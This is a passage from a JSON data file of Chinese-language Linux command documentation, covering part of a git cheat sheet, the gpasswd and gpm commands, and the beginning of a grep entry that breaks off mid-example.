以哈希值3defc69，新建 newBrach 分支，并切换到该分支</span>\n</code></pre>\n<h3 id=\"连接\">连接</h3>\n<pre><code class=\"language-shell\">git branch --<span class=\"hljs-built_in\">set</span>-upstream <span class=\"hljs-built_in\">dev</span> origin/<span class=\"hljs-built_in\">dev</span>     # 将本地<span class=\"hljs-built_in\">dev</span>分支与远程<span class=\"hljs-built_in\">dev</span>分支之间建立链接  \ngit branch --<span class=\"hljs-built_in\">set</span>-upstream master origin/<span class=\"hljs-built_in\">next</span> # 手动建立追踪关系  \n</code></pre>\n<h3 id=\"分支切换\">分支切换</h3>\n<pre><code class=\"language-shell\">git checkout <span class=\"hljs-built_in\">test</span>     <span class=\"hljs-comment\"># 切换到test分支   </span>\ngit checkout -b <span class=\"hljs-built_in\">test</span>  <span class=\"hljs-comment\"># 新建+切换到test分支   </span>\ngit checkout -b <span class=\"hljs-built_in\">test</span> dev <span class=\"hljs-comment\"># 基于dev新建test分支，并切换   </span>\n</code></pre>\n<h2 id=\"远端\">远端</h2>\n<pre><code class=\"language-shell\">git fetch &lt;远程主机名&gt; &lt;分支名&gt;   <span class=\"hljs-comment\"># fetch取回所有分支（branch）的更新  </span>\ngit fetch <span class=\"hljs-keyword\">origin </span>remotebranch[:localbranch]   <span class=\"hljs-comment\">#  从远端拉去分支[到本地指定分支]   </span>\ngit merge <span class=\"hljs-keyword\">origin/branch </span>  <span class=\"hljs-comment\"># 合并远端上指定分支   </span>\ngit pull <span class=\"hljs-keyword\">origin </span>remotebranch:localbranch  <span class=\"hljs-comment\">#  拉去远端分支到本地分支   </span>\ngit push <span class=\"hljs-keyword\">origin </span><span class=\"hljs-keyword\">branch </span>   <span class=\"hljs-comment\"># 将当前分支，推送到远端上指定分支   </span>\ngit push <span class=\"hljs-keyword\">origin </span>localbranch:remotebranch  <span class=\"hljs-comment\"># 推送本地指定分支，到远端上指定分支   </span>\ngit push <span class=\"hljs-keyword\">origin </span>:remotebranch   <span class=\"hljs-comment\"># 删除远端指定分支   </span>\ngit checkout -<span class=\"hljs-keyword\">b </span>[--track] test <span class=\"hljs-keyword\">origin/dev </span><span class=\"hljs-comment\"># 基于远端dev分支，新建本地test分支[同时设置跟踪]  </span>\n</code></pre>\n<h2 id=\"submodule\">submodule</h2>\n<p>克隆项目同时克隆submodule</p>\n<pre><code class=\"language-shell\">git clone https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/jaywcjlove/</span>handbook.git --depth=<span class=\"hljs-number\">1</span> --recurse-submodules\n</code></pre>\n<p>克隆项目，之后再手动克隆 submodule 子项目</p>\n<pre><code class=\"language-shell\">git submodule <span class=\"hljs-keyword\">add</span> --force <span class=\"hljs-string\">'仓库地址'</span> <span class=\"hljs-string\">'路径'</span>\n<span class=\"hljs-meta\"># 其中，仓库地址是指子模块仓库地址，路径指将子模块放置在当前工程下的路径。</span>\n<span class=\"hljs-meta\"># 注意：路径不能以 / 结尾（会造成修改不生效）、不能是现有工程已有的目录（不能順利 Clone）</span>\ngit submodule <span class=\"hljs-keyword\">init</span> <span class=\"hljs-meta\"># 初始化submodule</span>\ngit submodule update <span class=\"hljs-meta\"># 更新submodule(必须在根目录执行命令)</span>\ngit submodule update --<span class=\"hljs-keyword\">init</span> --recursive  <span class=\"hljs-meta\"># 下载的工程带有submodule</span>\n</code></pre>\n<p>当使用<code>git clone</code>下来的工程中带有submodule时，初始的时候，submodule的内容并不会自动下载下来的，此时，只需执行如下命令：</p>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">submodule </span>foreach git pull  <span class=\"hljs-comment\"># submodule 里有其他的 submodule 一次更新</span>\ngit <span class=\"hljs-keyword\">submodule </span>foreach git pull <span class=\"hljs-keyword\">origin </span>master <span class=\"hljs-comment\"># submodule更新</span>\n\ngit <span class=\"hljs-keyword\">submodule </span>foreach --recursive git <span class=\"hljs-keyword\">submodule </span>init\ngit <span class=\"hljs-keyword\">submodule </span>foreach --recursive git <span class=\"hljs-keyword\">submodule </span>update\n</code></pre>\n<h2 id=\"删除文件\">删除文件</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">git</span> rm -rf node_modules/\n</code></pre>\n<h2 id=\"remote-1\">remote</h2>\n<p>git是一个分布式代码管理工具，所以可以支持多个仓库，在git里，服务器上的仓库在本地称之为remote。个人开发时，多源用的可能不多，但多源其实非常有用。  </p>\n<pre><code class=\"language-shell\">git remote <span class=\"hljs-built_in\">add</span> origin1 git@github.com:yanhaijing/data.js.git  \ngit remote    <span class=\"hljs-comment\"># 显示全部源  </span>\ngit remote -v <span class=\"hljs-comment\"># 显示全部源+详细信息  </span>\ngit remote <span class=\"hljs-built_in\">rename</span> origin1 origin2 <span class=\"hljs-comment\"># 重命名  </span>\ngit remote rm origin    <span class=\"hljs-comment\"># 删除  </span>\ngit remote show origin  <span class=\"hljs-comment\"># 查看指定源的全部信息  </span>\n</code></pre>\n<h2 id=\"标签tag\">标签tag</h2>\n<p>当开发到一定阶段时，给程序打标签是非常棒的功能。  </p>\n<pre><code class=\"language-shell\">git <span class=\"hljs-keyword\">tag</span> <span class=\"hljs-title\">-a</span> v0.<span class=\"hljs-number\">1</span> -m 'my <span class=\"hljs-keyword\">version</span> <span class=\"hljs-number\">1.4</span>' <span class=\"hljs-comment\"># 新建带注释标签   </span>\ngit push origin --tags              <span class=\"hljs-comment\"># 一次性推送所有分支 </span>\ngit push origin v1.<span class=\"hljs-number\">5</span>                <span class=\"hljs-comment\"># 推送单个tag到orgin源上 </span>\ngit <span class=\"hljs-keyword\">tag</span> <span class=\"hljs-title\">-v</span> v1.<span class=\"hljs-number\">4.2</span>.<span class=\"hljs-number\">1</span>                 <span class=\"hljs-comment\"># 验证标签，验证已经签署的标签</span>\ngit show v1.<span class=\"hljs-number\">5</span>                       <span class=\"hljs-comment\"># 看到对应的 GPG 签</span>\n\ngit <span class=\"hljs-keyword\">tag</span>        <span class=\"hljs-title\"># 列出现有标签   \ngit</span> <span class=\"hljs-keyword\">tag</span> <span class=\"hljs-title\">v0gi</span>.<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\"># 新建标签   </span>\ngit checkout tagname   <span class=\"hljs-comment\"># 切换到标签       </span>\ngit <span class=\"hljs-keyword\">tag</span> <span class=\"hljs-title\">-d</span> v0.<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\"># 删除标签   </span>\ngit push origin :refs/tags/v0.<span class=\"hljs-number\">1</span> <span class=\"hljs-comment\"># 删除远程标签   </span>\ngit pull --all <span class=\"hljs-comment\"># 获取远程所有内容包括tag  </span>\ngit --<span class=\"hljs-attr\">git-dir=</span>'<span class=\"hljs-tag\">&lt;绝对地址&gt;</span>/.git' describe --tags HEAD <span class=\"hljs-comment\"># 查看本地版本信息  </span>\n</code></pre>\n<h2 id=\"日志log\">日志log</h2>\n<pre><code class=\"language-shell\">git config format.pretty oneline  <span class=\"hljs-comment\">#显示历史记录时，每个提交的信息只显示一行   </span>\ngit config color.ui true <span class=\"hljs-comment\">#彩色的 git 输出   </span>\ngit <span class=\"hljs-keyword\">log</span> <span class=\"hljs-comment\">#查看最近的提交日志   </span>\ngit <span class=\"hljs-keyword\">log</span> --pretty=oneline <span class=\"hljs-comment\">#单行显示提交日志   </span>\ngit <span class=\"hljs-keyword\">log</span> --graph --pretty=oneline --abbrev-commit   \ngit <span class=\"hljs-keyword\">log</span> -num <span class=\"hljs-comment\">#显示第几条log（倒数）   </span>\ngit reflog <span class=\"hljs-comment\">#查看所有分支的所有操作记录   </span>\ngit <span class=\"hljs-keyword\">log</span> --since=<span class=\"hljs-number\">1</span>.day <span class=\"hljs-comment\">#一天内的提交；你可以给出各种时间格式，比如说具体的某一天（“2008-01-15”），或者是多久以前（“2 years 1 day 3 minutes ago”）。   </span>\ngit <span class=\"hljs-keyword\">log</span> --pretty=<span class=\"hljs-string\">\"%h - %s\"</span> --author=自己的名字 <span class=\"hljs-comment\">#查看自己的日志   </span>\ngit <span class=\"hljs-keyword\">log</span> -p -<span class=\"hljs-number\">2</span> <span class=\"hljs-comment\">#展开两次更新显示每次提交的内容差异   </span>\ngit <span class=\"hljs-keyword\">log</span> --<span class=\"hljs-keyword\">stat</span> <span class=\"hljs-comment\">#要快速浏览其他协作者提交的更新都作了哪些改动   </span>\ngit <span class=\"hljs-keyword\">log</span> --pretty=<span class=\"hljs-keyword\">format</span>:<span class=\"hljs-string\">\"%h - %an, %ar : %s\"</span><span class=\"hljs-comment\">#定制要显示的记录格式   </span>\ngit <span class=\"hljs-keyword\">log</span> --pretty=<span class=\"hljs-keyword\">format</span>:<span class=\"hljs-string\">'%h : %s'</span> --date-order --graph <span class=\"hljs-comment\"># 拓扑顺序展示   </span>\ngit <span class=\"hljs-keyword\">log</span> --pretty=<span class=\"hljs-keyword\">format</span>:<span class=\"hljs-string\">'%h : %s - %ad'</span> --date=short <span class=\"hljs-comment\">#日期YYYY-MM-DD显示   </span>\ngit <span class=\"hljs-keyword\">log</span> &lt;<span class=\"hljs-keyword\">last</span> tag&gt; HEAD --pretty=<span class=\"hljs-keyword\">format</span>:%s <span class=\"hljs-comment\"># 只显示commit   </span>\ngit config --global format.pretty <span class=\"hljs-string\">'%h : %s - %ad'</span> --date=short <span class=\"hljs-comment\">#日期YYYY-MM-DD显示 写入全局配置</span>\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>选项</th>\n<th>说明</th>\n<th>选项</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>%H</td>\n<td>提交对象（commit）的完整哈希字串</td>\n<td>%ad</td>\n<td>作者修订日期（可以用 -date= 选项定制格式）</td>\n</tr>\n<tr>\n<td>%h</td>\n<td>提交对象的简短哈希字串</td>\n<td>%ar</td>\n<td>作者修订日期，按多久以前的方式显示</td>\n</tr>\n<tr>\n<td>%T</td>\n<td>树对象（tree）的完整哈希字串</td>\n<td>%cn</td>\n<td>提交者(committer)的名字</td>\n</tr>\n<tr>\n<td>%t</td>\n<td>树对象的简短哈希字串</td>\n<td>%ce</td>\n<td>提交者的电子邮件地址</td>\n</tr>\n<tr>\n<td>%P</td>\n<td>父对象（parent）的完整哈希字串</td>\n<td>%cd</td>\n<td>提交日期</td>\n</tr>\n<tr>\n<td>%p</td>\n<td>父对象的简短哈希字串</td>\n<td>%cr</td>\n<td>提交日期，按多久以前的方式显示</td>\n</tr>\n<tr>\n<td>%an</td>\n<td>作者（author）的名字</td>\n<td>%s</td>\n<td>提交说明</td>\n</tr>\n<tr>\n<td>%ae</td>\n<td>作者的电子邮件地址</td>\n<td>-</td>\n<td>-</td>\n</tr>\n</tbody></table>\n<p><a href=\"https://git-scm.com/docs/git-log#_pretty_formats\">Pretty Formats</a></p>\n<h2 id=\"重写历史\">重写历史</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">git</span> <span class=\"hljs-string\">commit</span> <span class=\"hljs-built_in\">--amend</span>    <span class=\"hljs-comment\"># 改变最近一次提交  </span>\n<span class=\"hljs-string\">git</span> <span class=\"hljs-string\">rebase</span> -<span class=\"hljs-string\">i</span> <span class=\"hljs-string\">HEAD</span>~<span class=\"hljs-string\">3</span>  <span class=\"hljs-comment\"># 修改最近三次的提交说明，或者其中任意一次  </span>\n<span class=\"hljs-string\">git</span> <span class=\"hljs-string\">commit</span> <span class=\"hljs-built_in\">--amend</span>    <span class=\"hljs-comment\"># 保存好了，这些指示很明确地告诉了你该干什么  </span>\n<span class=\"hljs-string\">git</span> <span class=\"hljs-string\">rebase</span> <span class=\"hljs-built_in\">--continue</span> <span class=\"hljs-comment\"># 修改提交说明，退出编辑器。  </span>\n</code></pre>\n<pre><code class=\"language-shell\">pick f<span class=\"hljs-symbol\">7f</span><span class=\"hljs-symbol\">3f</span>6d changed my name a <span class=\"hljs-keyword\">bit\n</span>pick <span class=\"hljs-number\">310154</span>e updated README formatting <span class=\"hljs-keyword\">and </span><span class=\"hljs-keyword\">added </span><span class=\"hljs-keyword\">blame\n</span>pick a<span class=\"hljs-symbol\">5f</span>4a0d <span class=\"hljs-keyword\">added </span>cat-file\n</code></pre>\n<p>改成</p>\n<pre><code>pick <span class=\"hljs-number\">310154</span>e updated README formatting <span class=\"hljs-keyword\">and </span><span class=\"hljs-keyword\">added </span><span class=\"hljs-keyword\">blame\n</span>pick f<span class=\"hljs-symbol\">7f</span><span class=\"hljs-symbol\">3f</span>6d changed my name a <span class=\"hljs-keyword\">bit</span>\n</code></pre>\n<h3 id=\"删除仓库\">删除仓库</h3>\n<pre><code><span class=\"hljs-function\"><span class=\"hljs-title\">cd</span></span> ..\nrm -rf repo.git\n</code></pre>\n<p><a href=\"https://help.github.com/articles/changing-author-info/\">Github官方教程</a></p>\n<h2 id=\"其它\">其它</h2>\n<pre><code class=\"language-shell\">git <span class=\"hljs-built_in\">help</span> *  <span class=\"hljs-comment\"># 获取命令的帮助信息  </span>\ngit status  <span class=\"hljs-comment\"># 获取当前的状态，非常有用，因为git会提示接下来的能做的操作  </span>\n</code></pre>\n<h2 id=\"报错问题解决\">报错问题解决</h2>\n<p><strong>1. <code>git fatal: protocol error: bad line length character: No s</code></strong></p>\n<p>解决办法：更换remote地址为 <code>http/https</code> 的  </p>\n<p><strong>2. <code>The requested URL returned error: 403 Forbidden while accessing</code></strong></p>\n<p>解决github push错误的办法：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">#vim 编辑器打开 当前项目中的config文件</span>\nvim .git/config\n\n<span class=\"hljs-comment\">#修改</span>\n[remote <span class=\"hljs-string\">\"origin\"</span>]  \n    url = https:<span class=\"hljs-regexp\">//gi</span>thub.com<span class=\"hljs-regexp\">/jaywcjlove/</span>example.git  \n\n<span class=\"hljs-comment\">#为下面代码</span>\n[remote <span class=\"hljs-string\">\"origin\"</span>]  \n    url = https:<span class=\"hljs-regexp\">//</span>jaywcjlove@github.com<span class=\"hljs-regexp\">/jaywcjlove/</span>example.git  \n</code></pre>\n<p><strong>3. git status 显示中文问题</strong></p>\n<p>在查看状态的时候 git status 如果是中文就显示下面的情况</p>\n<pre><code class=\"language-shell\">\\<span class=\"hljs-number\">344\\272</span>\\<span class=\"hljs-number\">247\\345\\223</span>\\<span class=\"hljs-number\">201\\351\\234</span>\\<span class=\"hljs-number\">200\\346</span>\\<span class=\"hljs-number\">261\\202</span>\n</code></pre>\n<p>解决这个问题方法是：</p>\n<pre><code class=\"language-shell\">git config --global core.quotepath <span class=\"hljs-literal\">false</span>\n</code></pre>\n<h2 id=\"参考资料\">参考资料</h2>\n<ul>\n<li><a href=\"http://git-scm.com/\">Git官网</a></li>\n<li><a href=\"https://try.github.io\"><strong>Github 15分钟学习Git</strong></a></li>\n<li><a href=\"http://gitref.org/zh/index.html\">Git参考手册</a></li>\n<li><a href=\"http://www.mceiba.com/tool/git-cheat-sheet.html\">Git简明手册</a></li>\n<li><a href=\"http://www-cs-students.stanford.edu/~blynn/gitmagic/intl/zh_cn/\">Git Magic</a></li>\n<li><a href=\"http://gitbook.liuhui998.com/index.html\">Git Community Book 中文版</a></li>\n<li><a href=\"http://git-scm.com/book/en/v2\">Pro Git</a></li>\n<li><a href=\"http://marklodato.github.io/visual-git-guide/index-zh-cn.html\">图解Git</a></li>\n<li><a href=\"http://rogerdudler.github.io/git-guide/index.zh.html\">git-简明指南</a></li>\n<li><a href=\"http://pcottle.github.io/learnGitBranching/\">learnGitBranching 在线学习工具</a></li>\n<li><a href=\"http://rogerdudler.github.io/git-guide/index.zh.html\">初级教程</a> </li>\n<li><a href=\"http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000\">廖雪峰的Git教程</a></li>\n<li><a href=\"http://www.worldhello.net/gotgithub/\">蒋鑫老师将带你入github的大门</a></li>\n<li><a href=\"http://www.open-open.com/lib/view/open1328069609436.html\">git详解</a></li>\n<li><a href=\"http://git.oschina.net/progit/\">oschina教程</a></li>\n<li><a href=\"https://github.com/blog/2019-how-to-undo-almost-anything-with-git\">How to undo (almost) anything with Git撤销一切，汇总各种回滚撤销的场景，加强学习。</a></li>\n<li><a href=\"http://www.runoob.com/git/git-tutorial.html\">Git 教程 | 菜鸟教程runoob.com</a></li>\n<li><a href=\"https://gold.xitu.io/post/5842f9b861ff4b005889ade6\">Git 本地仓库和裸仓库</a></li>\n<li><a href=\"http://www.kancloud.cn/kancloud/igit/46710\">沉浸式学 Git</a></li>\n<li><a href=\"http://way.oschina.io/2016/12/15/notes/GitAdvance/?utm_source=gank.io&amp;utm_medium=email\">Git进阶用法，主要是rebase高级用法</a></li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "gpasswd",
        "des": "Linux下工作组文件的管理工具",
        "body": "<h1 id=\"gpasswd\">gpasswd</h1>\n<p>Linux下工作组文件的管理工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gpasswd命令</strong> 是Linux下工作组文件<code>/etc/group</code>和<code>/etc/gshadow</code>管理工具。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gpasswd</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：添加用户到组；</span>\n<span class=\"hljs-deletion\">-d：从组删除用户；</span>\n<span class=\"hljs-deletion\">-A：指定管理员；</span>\n<span class=\"hljs-deletion\">-M：指定组成员和-A的用途差不多；</span>\n<span class=\"hljs-deletion\">-r：删除密码；</span>\n<span class=\"hljs-deletion\">-R：限制用户登入组，只有组中的成员才可以用newgrp加入该组。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>组：指定要管理的工作组。</p>\n<h3 id=\"实例\">实例</h3>\n<p>如系统有个peter账户，该账户本身不是groupname群组的成员，使用newgrp需要输入密码即可。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">gpasswd groupname</span>\n</code></pre>\n<p>让使用者暂时加入成为该组成员，之后peter建立的文件group也会是groupname。所以该方式可以暂时让peter建立文件时使用其他的组，而不是peter本身所在的组。</p>\n<p>所以使用<code>gpasswd groupname</code>设定密码，就是让知道该群组密码的人可以暂时切换具备groupname群组功能的。</p>\n<pre><code class=\"language-shell\">gpasswd -<span class=\"hljs-selector-tag\">A</span> peter users\n</code></pre>\n<p>这样peter就是users群组的管理员，就可以执行下面的操作:</p>\n<pre><code class=\"language-shell\">gpasswd -<span class=\"hljs-selector-tag\">a</span> mary users\ngpasswd -<span class=\"hljs-selector-tag\">a</span> allen users\n</code></pre>\n<p>注意：添加用户到某一个组 可以使用<code>usermod -G group_name user_name</code>这个命令可以添加一个用户到指定的组，但是以前添加的组就会清空掉。</p>\n<p>所以想要添加一个用户到一个组，同时保留以前添加的组时，请使用gpasswd这个命令来添加操作用户：</p>\n<pre><code class=\"language-shell\">gpasswd -<span class=\"hljs-selector-tag\">a</span> user_name group_name\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "gpm",
        "des": "提供文字模式下的滑鼠事件处理",
        "body": "<h1 id=\"gpm\">gpm</h1>\n<p>提供文字模式下的滑鼠事件处理</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>gpm命令</strong> 是Linux的虚拟控制台下的鼠标服务器，用于在虚拟控制台下实现鼠标复制和粘贴文本的功能。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">gpm</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：设置加速值；</span>\n<span class=\"hljs-deletion\">-b：设置波特率；</span>\n<span class=\"hljs-deletion\">-B：设置鼠标按键次序；</span>\n<span class=\"hljs-deletion\">-m：指定鼠标设备文件；</span>\n<span class=\"hljs-deletion\">-t：设置鼠标类型。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "grep",
        "des": "强大的文本搜索工具",
        "body": "<h1 id=\"grep\">grep</h1>\n<p>强大的文本搜索工具</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>grep</strong> （global search regular expression(RE) and print out the line，全面搜索正则表达式并把行打印出来）是一种强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来。用于过滤/搜索的特定字符。可使用正则表达式能配合多种命令使用，使用上十分灵活。</p>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span>a --text  <span class=\"hljs-comment\"># 不要忽略二进制数据。</span>\n<span class=\"hljs-literal\">-</span>A &lt;显示行数&gt;   --after-context=&lt;显示行数&gt;   <span class=\"hljs-comment\"># 除了显示符合范本样式的那一行之外，并显示该行之后的内容。</span>\n<span class=\"hljs-literal\">-</span>b --byte-offset                           <span class=\"hljs-comment\"># 在显示符合范本样式的那一行之外，并显示该行之前的内容。</span>\n<span class=\"hljs-literal\">-</span>B&lt;显示行数&gt;   --before-context=&lt;显示行数&gt;   <span class=\"hljs-comment\"># 除了显示符合样式的那一行之外，并显示该行之前的内容。</span>\n<span class=\"hljs-literal\">-</span>c --count    <span class=\"hljs-comment\"># 计算符合范本样式的列数。</span>\n<span class=\"hljs-literal\">-</span>C&lt;显示行数&gt; --context=&lt;显示行数&gt;或-&lt;显示行数&gt; <span class=\"hljs-comment\"># 除了显示符合范本样式的那一列之外，并显示该列之前后的内容。</span>\n<span class=\"hljs-literal\">-</span>d&lt;进行动作&gt; --directories=&lt;动作&gt;  <span class=\"hljs-comment\"># 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep命令将回报信息并停止动作。</span>\n<span class=\"hljs-literal\">-</span>e&lt;范本样式&gt; --regexp=&lt;范本样式&gt;   <span class=\"hljs-comment\"># 指定字符串作为查找文件内容的范本样式。</span>\n<span class=\"hljs-literal\">-</span>E --extended-regexp             <span class=\"hljs-comment\"># 将范本样式为延伸的普通表示法来使用，意味着使用能使用扩展正则表达式。</span>\n<span class=\"hljs-literal\">-</span>f&lt;范本文件&gt; --file=&lt;规则文件&gt;     <span class=\"hljs-comment\"># 指定范本文件，其内容有一个或多个范本样式，让grep查找符合范本条件的文件内容，格式为每一列的范本样式。</span>\n<span class=\"hljs-literal\">-</span>F --fixed-regexp   <span class=\"hljs-comment\"># 将范本样式视为固定字符串的列表。</span>\n<span class=\"hljs-literal\">-</span>G --basic-regexp   <span class=\"hljs-comment\"># 将范本样式视为普通的表示法来使用。</span>\n<span class=\"hljs-literal\">-</span>h --no-filename    <span class=\"hljs-comment\"># 在显示符合范本样式的那一列之前，不标示该列所属的文件名称。</span>\n<span class=\"hljs-literal\">-</span>H --with-filename  <span class=\"hljs-comment\"># 在显示符合范本样式的那一列之前，标示该列的文件名称。</span>\n<span class=\"hljs-literal\">-</span>i --ignore-case    <span class=\"hljs-comment\"># 忽略字符大小写的差别。</span>\n<span class=\"hljs-literal\">-</span>l --file-with-matches   <span class=\"hljs-comment\"># 列出文件内容符合指定的范本样式的文件名称。</span>\n<span class=\"hljs-literal\">-</span>L --files-without-match <span class=\"hljs-comment\"># 列出文件内容不符合指定的范本样式的文件名称。</span>\n<span class=\"hljs-literal\">-</span>n --line-number         <span class=\"hljs-comment\"># 在显示符合范本样式的那一列之前，标示出该列的编号。</span>\n<span class=\"hljs-literal\">-</span>P --perl-regexp         <span class=\"hljs-comment\"># PATTERN 是一个 Perl 正则表达式</span>\n<span class=\"hljs-literal\">-</span>q --quiet或--silent     <span class=\"hljs-comment\"># 不显示任何信息。</span>\n<span class=\"hljs-literal\">-</span>R/-r  --recursive       <span class=\"hljs-comment\"># 此参数的效果和指定“-d recurse”参数相同。</span>\n<span class=\"hljs-literal\">-</span>s --no-messages  <span class=\"hljs-comment\"># 不显示错误信息。</span>\n<span class=\"hljs-literal\">-</span>v --revert-match <span class=\"hljs-comment\"># 反转查找。</span>\n<span class=\"hljs-literal\">-</span>V --version      <span class=\"hljs-comment\"># 显示版本信息。   </span>\n<span class=\"hljs-literal\">-</span>w --word-regexp  <span class=\"hljs-comment\"># 只显示全字符合的列。</span>\n<span class=\"hljs-literal\">-</span>x --line-regexp  <span class=\"hljs-comment\"># 只显示全列符合的列。</span>\n<span class=\"hljs-literal\">-</span>y <span class=\"hljs-comment\"># 此参数效果跟“-i”相同。</span>\n<span class=\"hljs-literal\">-</span>o <span class=\"hljs-comment\"># 只输出文件中匹配到的部分。</span>\n<span class=\"hljs-literal\">-</span>m &lt;num&gt; --max-count=&lt;num&gt; <span class=\"hljs-comment\"># 找到num行结果后停止查找，用来限制匹配行数</span>\n</code></pre>\n<h3 id=\"规则表达式\">规则表达式</h3>\n<pre><code class=\"language-shell\">^    <span class=\"hljs-meta\"># 锚定行的开始 如：<span class=\"hljs-string\">'^grep'</span>匹配所有以grep开头的行。    </span>\n$    <span class=\"hljs-meta\"># 锚定行的结束 如：<span class=\"hljs-string\">'grep$'</span> 匹配所有以grep结尾的行。</span>\n.    <span class=\"hljs-meta\"># 匹配一个非换行符的字符 如：<span class=\"hljs-string\">'gr.p'</span>匹配gr后接一个任意字符，然后是p。    </span>\n*    <span class=\"hljs-meta\"># 匹配零个或多个先前字符 如：<span class=\"hljs-string\">'*grep'</span>匹配所有一个或多个空格后紧跟grep的行。    </span>\n.*   <span class=\"hljs-meta\"># 一起用代表任意字符。   </span>\n[]   <span class=\"hljs-meta\"># 匹配一个指定范围内的字符，如<span class=\"hljs-string\">'[Gg]rep'</span>匹配Grep和grep。    </span>\n[^]  <span class=\"hljs-meta\"># 匹配一个不在指定范围内的字符，如：<span class=\"hljs-string\">'[^A-FH-Z]rep'</span>匹配不包含A-R和T-Z的一个字母开头，紧跟rep的行。    </span>\n\\(..\\)  <span class=\"hljs-meta\"># 标记匹配字符，如<span class=\"hljs-string\">'\\(love\\)'</span>，love被标记为1。    </span>\n\\&lt;      <span class=\"hljs-meta\"># 锚定单词的开始，如:<span class=\"hljs-string\">'\\&lt;grep'</span>匹配包含以grep开头的单词的行。    </span>\n\\&gt;      <span class=\"hljs-meta\"># 锚定单词的结束，如<span class=\"hljs-string\">'grep\\&gt;'</span>匹配包含以grep结尾的单词的行。    </span>\nx\\{m\\}  <span class=\"hljs-meta\"># 重复字符x，m次，如：<span class=\"hljs-string\">'0\\{5\\}'</span>匹配包含5个o的行。    </span>\nx\\{m,\\}   <span class=\"hljs-meta\"># 重复字符x,至少m次，如：<span class=\"hljs-string\">'o\\{5,\\}'</span>匹配至少有5个o的行。    </span>\nx\\{m,n\\}  <span class=\"hljs-meta\"># 重复字符x，至少m次，不多于n次，如：<span class=\"hljs-string\">'o\\{5,10\\}'</span>匹配5--10个o的行。   </span>\n\\w    <span class=\"hljs-meta\"># 匹配文字和数字字符，也就是[A-Za-z0-9]，如：<span class=\"hljs-string\">'G\\w*p'</span>匹配以G后跟零个或多个文字或数字字符，然后是p。   </span>\n\\W    <span class=\"hljs-meta\"># \\w的反置形式，匹配一个或多个非单词字符，如点号句号等。   </span>\n\\b    <span class=\"hljs-meta\"># 单词锁定符，如: <span class=\"hljs-string\">'\\bgrep\\b'</span>只匹配grep。  </span>\n</code></pre>\n<h2 id=\"grep命令常见用法\">grep命令常见用法</h2>\n<p>在文件中搜索一个单词，命令会返回一个包含 <strong>“match_pattern”</strong> 的文本行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> match_pattern file_name\n<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-string\">\"match_pattern\"</span> file_name\n</code></pre>\n<p>在多个文件中查找：</p>\n<pre><code class=\"language-shell\">grep <span class=\"hljs-string\">\"match_pattern\"</span> file_1 file_2 file_3 ...\n</code></pre>\n<p>输出除之外的所有行  <strong>-v</strong>  选项：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> -v <span class=\"hljs-string\">\"match_pattern\"</span> file_name\n</code></pre>\n<p>标记匹配颜色  <strong>--color=auto</strong>  选项：</p>\n<pre><code class=\"language-shell\">grep <span class=\"hljs-string\">\"match_pattern\"</span> <span class=\"hljs-built_in\">file_name</span> --<span class=\"hljs-built_in\">color</span>=auto\n</code></pre>\n<p>使用正则表达式  <strong>-E</strong>  选项：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">grep</span> -E <span class=\"hljs-string\">\"[1-9]+\"</span>\n<span class=\"hljs-comment\"># 或</span>\negrep <span class=\"hljs-string\">\"[1-9]+\"</span>\n</code></pre>\n<p>使用正则表达式  <strong>-P</strong>  选项：</p>\n<pre><code class=\"language-shell\"><span class=\"language-xml\">grep -P \"(\\d</span><span class=\"hljs-template-variable\">{3}</span><span class=\"language-xml\">\\-)</span><span class=\"hljs-template-variable\">{2}</span><span class=\"language-xml\">\\d</span><span class=\"hljs-template-variable\">{4}</span><span class=\"language-xml\">\" file_name</span>\n</code></pre>\n<p>只输出文件中匹配到的部分  <strong>-o</strong>  选项：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> this <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> test <span class=\"hljs-built_in\">line</span>. | <span class=\"hljs-keyword\">grep</span> -<span class=\"hljs-keyword\">o</span> -E <span class=\"hljs-string\">\"[a-z]+\\.\"</span>\n<span class=\"hljs-built_in\">line</span>.\n\n<span class=\"hljs-keyword\">echo</span> this <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">a</span> test <span 